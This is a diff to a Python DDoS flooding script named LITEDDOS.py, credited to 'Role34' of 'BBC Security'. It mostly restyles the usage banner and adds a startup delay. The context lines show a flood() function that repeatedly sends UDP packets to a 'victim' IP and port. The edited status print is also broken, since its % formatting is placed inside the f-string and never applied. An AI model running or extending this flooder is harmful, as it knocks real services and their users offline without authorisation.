@@ -32,25 +32,28 @@ class logo:
 {yellow}|       Big Black Cap Security (BBCSec)       |
 {cyan} ============================================={nc}''')
 
+time.sleep(5)
 os.system("clear")
 
 def usage():
     print(f'''\007
-    {green}#########################################################
-    #------------------------[{BIRed}LITE-DDOS{green}m]---------------------#
-    "#-------------------------------------------------------#"
-    "#   {BIRed}Command: " "python3 LITEDDOS.py " "<ip> <port> <packet> {green}m   #"
-    "#                                                       #"
-    "#{BIRed}Creator: Role34  {green}m##      ###       ##                #"
-    "#{BIRed}Title  : Founder        {green}m##     #          ##                #"
-    "#{BIRed}Version: 1.0.0.0        {green}m##      ###       ##                #"
-    "#                   ## {BIRed} ##     {green}m#  {BIRed}##  {green}m##                #"
-    "#                   ##  {BIRed}##  {green}m###   {BIRed}##  {green}m######            #"
-    "#               {BIRed}<--[BBC Security]-->         {green}m#"
-    "#########################################################"
-    "                        @@@@@@@@@@"
-    "                       @@@@@@@@@@@@"
-    "                     @@@@@@@@@@@@@@@@"{nc}''')
+    {green} ____________________________________________________________
+    |                                                            |
+    |                        [{BIRed}LITE-DDOS{green}]                         |
+    |                                                            |
+    |     {BIRed}Command: python3 LITEDDOS.py <ip> <port> <packet>{green}      |
+    |                                                            |
+    |{BIRed}Creator: Role34{green}                                             |
+    |{BIRed}Title  : Founder{green}                                            |
+    |{BIRed}Version: 1.0.0.0{green}                                            |
+    |                                                            |
+    |                                                            |
+    |                    {BIRed}<--[BBC Security]-->{green}                    |
+    |                                                            |
+    |____________________________________________________________|
+                              /         \
+                             /           \
+                            /_____________\{nc}''')
 
 
 def flood(victim, vport, duration):
@@ -70,7 +73,7 @@ def flood(victim, vport, duration):
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print ("{BIRed}Start {green}%s {BIRed}Sended Packages {green}%s {BIRed}On Ports {green}%s "%(sent, victim, vport))
+        print (f'''{BIRed}Start {green}%s {BIRed}Sended Packages {green}%s {BIRed}On Ports {green}%s %(sent, victim, vport){nc}''')
 
 def main():
     print(len(sys.argv))
